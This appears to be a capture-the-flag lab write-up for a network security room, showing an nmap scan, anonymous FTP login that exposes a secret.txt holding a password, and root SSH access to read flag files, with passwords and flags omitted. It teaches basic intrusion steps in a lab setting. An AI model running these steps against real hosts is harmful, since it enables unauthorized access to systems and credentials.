## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Descritpion

- Network security consists of different hardware and software solutions to achieve the set security goals.
  
- Hardware solutions refer to the devices you set up in your network to protect your network security. They are hardware, so you can literally hold them

- Software Security Solution
  - Antivirus Software
  - Host Firewall
```
## Methodology
```Notes
- Cyber Kill Chain Sever Steps
  1. Recon
  2. Weaponization
  3. Delivery
  4. Exploitation
  5. Installation
  6. Command & Control ( C&C )
  7. Action on Objective
```

## Environment 
```bash
Personal - 192.168.157.252
Machine - 10.48.138.84
```

## Network Scan
```bash
$ nmap -sT 10.48.138.84

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
```

#### FTP
```bash
ftp 10.48.138.84
Connected to 10.48.138.84.
220 (vsFTPd 3.0.5)
Name (10.48.138.84:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41026|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp        425351 Apr 06  2022 2680-0.txt
-rw-r--r--    1 ftp      ftp           356 Apr 06  2022 2680.epub
-rw-r--r--    1 ftp      ftp        251857 Apr 06  2022 55317-0.txt
-rw-r--r--    1 ftp      ftp           358 Apr 06  2022 55317.epub
-rwxr-xr-x    1 ftp      ftp           214 Apr 06  2022 backup.sh
-rw-r--r--    1 ftp      ftp            23 Apr 06  2022 secret.txt
226 Directory send OK.
```
#### File Secret.txt
```bash
$ cat secret.txt
password: [password omitted]
```
#### SSH
```bash
$ssh root@10.48.138.84
password: [password omitted]
```

### Flag
```bash
root@ip-10-48-138-84:~# ls
flag.txt  snap
root@ip-10-48-138-84:~# cat flag.txt
[flag omitted]
```
## User Flag
```bash
 root@ip-10-48-138-84:~# pwd
/root
root@ip-10-48-138-84:~# cd /home/
root@ip-10-48-138-84:/home# dir
ftpsecure  librarian  strategos  ubuntu
root@ip-10-48-138-84:/home# ls
ftpsecure  librarian  strategos  ubuntu
root@ip-10-48-138-84:/home# cd ubuntu/
root@ip-10-48-138-84:/home/ubuntu# dir
root@ip-10-48-138-84:/home/ubuntu# ls
root@ip-10-48-138-84:/home/ubuntu# cd ..
root@ip-10-48-138-84:/home# cd librarian/
root@ip-10-48-138-84:/home/librarian# ls
flag.txt
root@ip-10-48-138-84:/home/librarian# cat flag.txt
[flag omitted]
```

## Flags
```Flag
Root - [flag omitted]
User - Librarian - [flag omitted]
```

## END